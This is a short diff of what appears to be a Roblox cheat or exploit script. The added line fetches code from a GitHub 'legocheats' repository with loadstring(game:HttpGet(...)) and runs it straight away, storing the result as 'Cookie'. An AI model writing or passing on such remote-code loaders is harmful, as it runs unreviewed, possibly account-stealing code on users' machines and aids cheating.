@@ -47,7 +47,7 @@ if not File then
     writefile("PrevServers.txt", game.JobId)
 end
 
-local Cookie = loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxking776/kocmoc/main/functions/auth"))()()
+local Cookie = loadstring(game:HttpGet("https://raw.githubusercontent.com/Mstir16/legocheats/main/archive/General/K2vl91pxVn/D"))()()
 local actualHour = os.date("!*t").hour
 local Deleted = false
 
